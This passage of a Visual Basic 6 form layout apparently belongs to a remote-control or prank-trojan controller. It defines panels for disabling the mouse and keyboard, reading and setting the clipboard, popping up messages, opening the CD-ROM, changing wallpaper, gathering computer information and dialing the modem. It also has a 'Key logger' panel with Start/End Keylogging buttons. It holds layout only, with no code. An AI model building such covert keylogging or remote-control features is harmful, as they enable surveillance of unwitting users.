            Caption         =   "Check for a sound card:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   151
            Top             =   1920
            Width           =   1965
         End
         Begin VB.Label Label50 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Add file to documents:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   148
            Top             =   1440
            Width           =   1890
         End
         Begin VB.Label Label49 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Clear documents folder:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   146
            Top             =   960
            Width           =   2010
         End
         Begin VB.Label Label48 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Open system information dialog:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   144
            Top             =   480
            Width           =   2745
         End
         Begin VB.Image Image23 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":9CB0
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Mouse options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   8
         Left            =   360
         TabIndex        =   115
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdClearMouseCells 
            Caption         =   "&Clear cells"
            Height          =   375
            Left            =   3960
            TabIndex        =   142
            Top             =   3240
            Width           =   1215
         End
         Begin VB.CommandButton CmdRestoreButtons 
            Caption         =   "Res&tore"
            Height          =   375
            Left            =   2760
            TabIndex        =   141
            Top             =   3120
            Width           =   975
         End
         Begin VB.CommandButton CmdSwapMouseButtons 
            Caption         =   "S&wap"
            Height          =   375
            Left            =   1680
            TabIndex        =   140
            Top             =   3120
            Width           =   975
         End
         Begin VB.CommandButton CmdSetTrail 
            Caption         =   "&Set Trail"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   138
            Top             =   2640
            Width           =   1215
         End
         Begin VB.TextBox TextMouseTrail 
            Height          =   285
            Left            =   1680
            MaxLength       =   3
            TabIndex        =   137
            Top             =   2640
            Width           =   2055
         End
         Begin VB.OptionButton MousePosType02 
            Caption         =   "Y"
            Height          =   255
            Left            =   3960
            TabIndex        =   135
            Top             =   2280
            Width           =   375
         End
         Begin VB.OptionButton MousePosType01 
            Caption         =   "X"
            Height          =   255
            Left            =   3960
            TabIndex        =   134
            Top             =   1920
            Value           =   -1  'True
            Width           =   375
         End
         Begin VB.CommandButton CmdGetTypeMousePoint 
            Caption         =   "&Get"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   133
            Top             =   2040
            Width           =   1215
         End
         Begin VB.TextBox MouseYPos 
            Height          =   285
            Left            =   2280
            Locked          =   -1  'True
            TabIndex        =   132
            Top             =   2280
            Width           =   1455
         End
         Begin VB.TextBox MouseXPos 
            Height          =   285
            Left            =   2280
            Locked          =   -1  'True
            TabIndex        =   131
            Top             =   1920
            Width           =   1455
         End
         Begin VB.CommandButton CmdApplySetCursorPos 
            Caption         =   "&Apply X,Y"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   128
            Top             =   1440
            Width           =   1215
         End
         Begin VB.TextBox SetCursorY 
            Height          =   285
            Left            =   3600
            TabIndex        =   127
            Top             =   1440
            Width           =   855
         End
         Begin VB.TextBox SetCursorX 
            Height          =   285
            Left            =   2280
            MaxLength       =   5
            TabIndex        =   124
            Top             =   1440
            Width           =   855
         End
         Begin VB.CommandButton CmdDisableMouse 
            Caption         =   "&Disable"
            Height          =   375
            Left            =   2280
            TabIndex        =   122
            Top             =   960
            Width           =   1215
         End
         Begin VB.CommandButton CmdEnableMouse 
            Caption         =   "&Enable"
            Height          =   375
            Left            =   960
            TabIndex        =   121
            Top             =   960
            Width           =   1215
         End
         Begin VB.CommandButton CmdRequestDoubleClickRate 
            Caption         =   "&Request"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   118
            Top             =   480
            Width           =   1215
         End
         Begin VB.TextBox DoubleClickRate 
            Height          =   285
            Left            =   2160
            Locked          =   -1  'True
            TabIndex        =   117
            Top             =   480
            Width           =   2415
         End
         Begin VB.Label Label47 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Mouse buttons:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   139
            Top             =   3120
            Width           =   1305
         End
         Begin VB.Label Label46 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Set mouse trail:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   136
            Top             =   2640
            Width           =   1335
         End
         Begin VB.Label Label45 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Get mouse position (Y):"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   130
            Top             =   2280
            Width           =   1980
         End
         Begin VB.Label Label44 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Get mouse position (X):"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   129
            Top             =   1920
            Width           =   1980
         End
         Begin VB.Label Label43 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Y"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   3360
            TabIndex        =   126
            Top             =   1440
            Width           =   105
         End
         Begin VB.Label Label42 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "X"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   2040
            TabIndex        =   125
            Top             =   1440
            Width           =   105
         End
         Begin VB.Label Label41 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Set cursor position:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   123
            Top             =   1440
            Width           =   1635
         End
         Begin VB.Label Label40 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Mouse:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   120
            Top             =   960
            Width           =   600
         End
         Begin VB.Label Label39 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Get double click rate:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   116
            Top             =   480
            Width           =   1785
         End
         Begin VB.Image Image22 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":A57A
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Keyboard options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   7
         Left            =   360
         TabIndex        =   100
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdClearKeyBoardCells 
            Caption         =   "&Clear all"
            Height          =   375
            Left            =   4800
            TabIndex        =   119
            Top             =   2040
            Width           =   1095
         End
         Begin VB.CommandButton CmdSetRate 
            Caption         =   "&Set rate"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   109
            Top             =   1440
            Width           =   1215
         End
         Begin VB.Frame Frame5 
            Caption         =   "Key options (Turn on / Press)"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   975
            Left            =   240
            TabIndex        =   112
            Top             =   1920
            Width           =   4455
            Begin VB.CommandButton CmdKeyOptions 
               Caption         =   "&Key options"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   375
               Left            =   2880
               TabIndex        =   114
               Top             =   360
               Width           =   1215
            End
            Begin VB.Label Label15 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Click here for the Key option menu:"
               Height          =   195
               Left            =   120
               TabIndex        =   113
               Top             =   480
               Width           =   2535
            End
         End
         Begin VB.CommandButton CmdDisableKeyBoard 
            Caption         =   "&Disable"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   3960
            TabIndex        =   111
            Top             =   3240
            Width           =   1215
         End
         Begin VB.TextBox SetChrRate 
            Height          =   285
            Left            =   2400
            MaxLength       =   3
            TabIndex        =   108
            Top             =   1440
            Width           =   2175
         End
         Begin VB.CommandButton CmdGetRate 
            Caption         =   "G&et rate"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   106
            Top             =   960
            Width           =   1215
         End
         Begin VB.TextBox ChrBlinkRate 
            Height          =   285
            Left            =   2400
            Locked          =   -1  'True
            TabIndex        =   105
            Top             =   960
            Width           =   2175
         End
         Begin VB.TextBox KeyBoardType 
            Height          =   285
            Left            =   1920
            Locked          =   -1  'True
            TabIndex        =   103
            Top             =   480
            Width           =   2655
         End
         Begin VB.CommandButton CmdGetKeyboardType 
            Caption         =   "&Get type"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   102
            Top             =   480
            Width           =   1215
         End
         Begin VB.Label Label38 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   $"FrmMain.frx":AE44
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   450
            Left            =   240
            TabIndex        =   110
            Top             =   3120
            Width           =   3615
            WordWrap        =   -1  'True
         End
         Begin VB.Label Label37 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Set character blink rate:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   107
            Top             =   1440
            Width           =   2055
         End
         Begin VB.Label Label36 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Get character blink rate:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   104
            Top             =   960
            Width           =   2070
         End
         Begin VB.Label Label35 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Get Keyboard type:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   101
            Top             =   480
            Width           =   1635
         End
         Begin VB.Image Image20 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":AEFB
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Clipboard options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   6
         Left            =   360
         TabIndex        =   55
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdClearClipBoardLog 
            Caption         =   "&Clear"
            Height          =   375
            Left            =   240
            TabIndex        =   99
            Top             =   3360
            Width           =   1215
         End
         Begin VB.CommandButton CmdSetText 
            Caption         =   "&Set text"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   2640
            TabIndex        =   61
            Top             =   3360
            Width           =   1215
         End
         Begin VB.CommandButton CmdGetText 
            Caption         =   "&Get text"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   3960
            TabIndex        =   60
            Top             =   3360
            Width           =   1215
         End
         Begin VB.TextBox TextClipBoard 
            Height          =   1935
            Left            =   240
            MultiLine       =   -1  'True
            ScrollBars      =   3  'Both
            TabIndex        =   59
            Top             =   1320
            Width           =   4935
         End
         Begin VB.CommandButton CmdApplyClearClip 
            Caption         =   "&Apply"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   1800
            TabIndex        =   57
            Top             =   360
            Width           =   1215
         End
         Begin VB.Label Label2 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Set text to clipboard:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   58
            Top             =   960
            Width           =   1785
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Empty clipboard:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   56
            Top             =   480
            Width           =   1410
         End
         Begin VB.Image Image19 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":B7C5
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Miscella'neous options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   5
         Left            =   360
         TabIndex        =   32
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdPrintText 
            Caption         =   "P&rinting"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   3120
            TabIndex        =   54
            Top             =   3240
            Width           =   1095
         End
         Begin VB.CommandButton CmdCloseCDROM 
            Caption         =   "Cl&ose"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   1560
            TabIndex        =   52
            Top             =   3240
            Width           =   1095
         End
         Begin VB.CommandButton CmdCheckPath 
            Caption         =   "C&heck"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   51
            Top             =   2400
            Width           =   1095
         End
         Begin VB.TextBox ExecPath 
            Height          =   285
            Left            =   1920
            TabIndex        =   50
            Top             =   2400
            Width           =   2775
         End
         Begin VB.CommandButton CmdChangeWallpaper 
            Caption         =   "&Change"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   48
            Top             =   1800
            Width           =   1095
         End
         Begin VB.TextBox ChangeWallpaperPath 
            Height          =   285
            Left            =   1920
            TabIndex        =   47
            Top             =   1800
            Width           =   2775
         End
         Begin VB.CommandButton CmdOpenCDROM 
            Caption         =   "&Open"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   360
            TabIndex        =   45
            Top             =   3240
            Width           =   1095
         End
         Begin VB.CommandButton CmdPlay 
            Caption         =   "&Play"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   43
            Top             =   1200
            Width           =   1095
         End
         Begin VB.TextBox TextPlayWav 
            Height          =   285
            Left            =   1320
            TabIndex        =   42
            Top             =   1200
            Width           =   3375
         End
         Begin VB.OptionButton MessagePPType 
            Caption         =   "Critical"
            Height          =   195
            Index           =   4
            Left            =   5040
            TabIndex        =   40
            Top             =   780
            Width           =   855
         End
         Begin VB.OptionButton MessagePPType 
            Caption         =   "Exclamation"
            Height          =   195
            Index           =   3
            Left            =   3720
            TabIndex        =   39
            Top             =   780
            Width           =   1215
         End
         Begin VB.OptionButton MessagePPType 
            Caption         =   "Information"
            Height          =   195
            Index           =   2
            Left            =   2400
            TabIndex        =   38
            Top             =   780
            Width           =   1215
         End
         Begin VB.OptionButton MessagePPType 
            Caption         =   "Question"
            Height          =   195
            Index           =   1
            Left            =   1320
            TabIndex        =   37
            Top             =   780
            Width           =   975
         End
         Begin VB.OptionButton MessagePPType 
            Caption         =   "OK Only"
            Height          =   195
            Index           =   0
            Left            =   240
            TabIndex        =   36
            Top             =   780
            Value           =   -1  'True
            Width           =   975
         End
         Begin VB.CommandButton CmdSendMessage 
            Caption         =   "&Send"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   35
            Top             =   360
            Width           =   1095
         End
         Begin VB.TextBox MessagePopup 
            Height          =   285
            Left            =   1680
            MaxLength       =   100
            TabIndex        =   34
            Top             =   360
            Width           =   3015
         End
         Begin VB.Label Label32 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Text Printing:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   2880
            TabIndex        =   53
            Top             =   2880
            Width           =   1140
         End
         Begin VB.Label Label31 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "File is executable?:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   49
            Top             =   2400
            Width           =   1590
         End
         Begin VB.Label Label30 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Change wallpaper:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   46
            Top             =   1800
            Width           =   1545
         End
         Begin VB.Label Label29 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "CD-ROM:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   44
            Top             =   2880
            Width           =   735
         End
         Begin VB.Label Label28 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Play sound :"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   41
            Top             =   1200
            Width           =   1005
         End
         Begin VB.Label Label27 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Message popup:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   33
            Top             =   360
            Width           =   1365
         End
         Begin VB.Image Image18 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":C08F
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Computer information"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   4
         Left            =   360
         TabIndex        =   28
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdClearInfo 
            Caption         =   "&Clear"
            Height          =   375
            Left            =   2880
            TabIndex        =   31
            Top             =   3240
            Width           =   1140
         End
         Begin VB.CommandButton CmdRequestInfo 
            Caption         =   "&Request"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4200
            TabIndex        =   30
            Top             =   3240
            Width           =   1095
         End
         Begin VB.TextBox TextComputerInfo 
            Height          =   2775
            Left            =   255
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            ScrollBars      =   3  'Both
            TabIndex        =   29
            Top             =   360
            Width           =   5640
         End
         Begin VB.Image Image17 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":C959
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Key logger"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   3
         Left            =   360
         TabIndex        =   20
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdClearKeyLog 
            Caption         =   "&Clear"
            Height          =   375
            Left            =   4560
            TabIndex        =   24
            Top             =   3240
            Width           =   1335
         End
         Begin VB.CommandButton CmdEndKeyLogging 
            Caption         =   "&End Keylogging"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   2760
            TabIndex        =   23
            Top             =   3240
            Width           =   1695
         End
         Begin VB.CommandButton CmdStartKeyLogging 
            Caption         =   "&Start Keylogging"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   240
            TabIndex        =   22
            Top             =   3240
            Width           =   1695
         End
         Begin VB.TextBox TextKeyLog 
            Height          =   2055
            Left            =   240
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            ScrollBars      =   3  'Both
            TabIndex        =   21
            Top             =   1080
            Width           =   5655
         End
         Begin VB.Label Label23 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   $"FrmMain.frx":D223
            Height          =   585
            Left            =   240
            TabIndex        =   25
            Top             =   360
            Width           =   5775
            WordWrap        =   -1  'True
         End
         Begin VB.Image Image16 
            Height          =   480
            Left            =   2040
            Picture         =   "FrmMain.frx":D2F8
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Modem options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   2
         Left            =   360
         TabIndex        =   8
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdDisconnect 
            Caption         =   "&Disconnect"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4440
            TabIndex        =   19
            Top             =   2160
            Width           =   1215
         End
         Begin VB.Frame Frame4 
            Caption         =   "Phone call:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   1455
            Left            =   240
            TabIndex        =   9
            Top             =   480
            Width           =   5655
            Begin VB.CommandButton CmdCall 
               Caption         =   "&Call"
               BeginProperty Font 
                  Name            =   "Tahoma"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   375
               Left            =   4200
               TabIndex        =   14
               Top             =   360
               Width           =   1215
            End
            Begin VB.TextBox CallName 
               Height          =   285
               Left            =   960
               TabIndex        =   13
               Top             =   720
               Width           =   3135
            End
            Begin VB.TextBox TextPhone 
               Height          =   285
               Left            =   960
               TabIndex        =   11
               Top             =   360
               Width           =   3135
            End
            Begin VB.Image Image14 
               Height          =   480
               Left            =   4920
